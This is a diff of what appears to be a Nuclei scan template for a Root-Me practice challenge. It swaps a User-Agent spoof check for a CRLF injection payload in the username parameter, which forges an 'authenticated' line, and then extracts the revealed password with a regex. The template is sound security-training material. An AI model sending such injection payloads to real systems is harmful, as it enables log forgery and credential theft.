@@ -1,26 +1,24 @@
-id: HTTP-User-agent
+id: CLRF
 
 info:
-  name: HTTP User-agent
+  name: CLRF
   author: Tomitom13
   severity: unknown
-  tags: user-agent,http,rootme
+  tags: clrf,rootme
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}"
-    headers:
-      User-Agent: "admin"
+      - "{{BaseURL}}index.php?username=admin%20authenticated.%0D%0AMeyo&password=n'importe-quoi"
+
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
-
       - type: word
         words:
-          - "<h3>Welcome master!"
+          - "password : "
         part: body
 
     extractors:
@@ -28,4 +26,4 @@ requests:
         name: password
         part: body
         regex:
-          - "Password: [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
+          - "password : [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
